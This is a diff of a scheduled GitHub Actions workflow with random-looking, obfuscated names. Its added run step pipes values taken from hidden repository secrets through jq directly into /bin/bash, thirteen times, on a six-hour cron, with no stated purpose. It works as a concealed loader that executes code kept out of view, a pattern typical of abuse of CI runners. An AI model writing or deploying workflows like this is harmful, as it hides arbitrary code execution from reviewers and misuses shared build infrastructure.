@@ -3,18 +3,28 @@ name: turanlifjs
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
+    - cron: '42 1/6 * * *'
 
-jobs:  # 16541
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: turanlifjs
         env:
-          esho9744: ${{ secrets.esho9744 }}
+          mbpys1043: ${{ secrets.mbpys1043 }}
         run: |
-          echo $esho9744 | jq -r .jue74429 | /bin/bash
-          echo $ltpig305 | jq -r .q35931 | /bin/bash
-          echo $k7630 | jq -r .ylktm78372 | /bin/bash
+          echo $mbpys1043 | jq -r .hoh3865 | /bin/bash
+          echo $eq701 | jq -r .sveci46373 | /bin/bash
+          echo $khjd57092 | jq -r .c93811 | /bin/bash
+          echo $xz5 | jq -r .j10 | /bin/bash
+          echo $t466 | jq -r .ioaa120 | /bin/bash
+          echo $jcr3986 | jq -r .hajsj8 | /bin/bash
+          echo $euo94 | jq -r .ok8 | /bin/bash
+          echo $xnop32875 | jq -r .uewtn58 | /bin/bash
+          echo $i207 | jq -r .zmppp6 | /bin/bash
+          echo $pa5867 | jq -r .uul72 | /bin/bash
+          echo $zd95915 | jq -r .loq0 | /bin/bash
+          echo $tu8796 | jq -r .mxt2901 | /bin/bash
+          echo $lmrfi6 | jq -r .gnhyp0 | /bin/bash
 
